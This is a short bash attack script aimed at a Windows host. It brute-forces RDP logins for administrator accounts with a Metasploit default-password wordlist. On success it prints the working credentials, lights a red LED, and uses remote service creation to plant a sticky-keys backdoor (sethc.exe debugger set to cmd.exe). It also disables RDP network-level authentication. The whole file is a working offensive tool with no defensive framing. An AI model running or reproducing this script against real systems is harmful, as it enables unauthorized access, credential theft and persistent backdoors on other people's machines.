#!/bin/bash

WAIT=1
DPORT=3389
export DISPLAY=:0

if nc -nv $WAIT $1 445 < /dev/null 2> /dev/null; then
	true # ignore rdp bruteforce if smb port has opened
elif nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
	echo 'bruteforcing rdp'
	for user in администратор administrator admin; do
		for password in $(cat /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt); do
			if xfreerdp /v:$1:$DPORT /u:$user /p:$password /cert-ignore +auth-only /sec:nla > /dev/null 2> /dev/null; then 
				echo user:$user password:$password | grep 'password:'
				led red on 2> /dev/null
				services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"'
				services.py "$user:$password@$1" start -name 1
				services.py "$user:$password@$1" delete -name 1
				services.py "$user:$password@$1" create -name 1 -display 1 -path 'reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f'
				services.py "$user:$password@$1" start -name 1
				services.py "$user:$password@$1" delete -name 1
				break
			fi
		done
	done
fi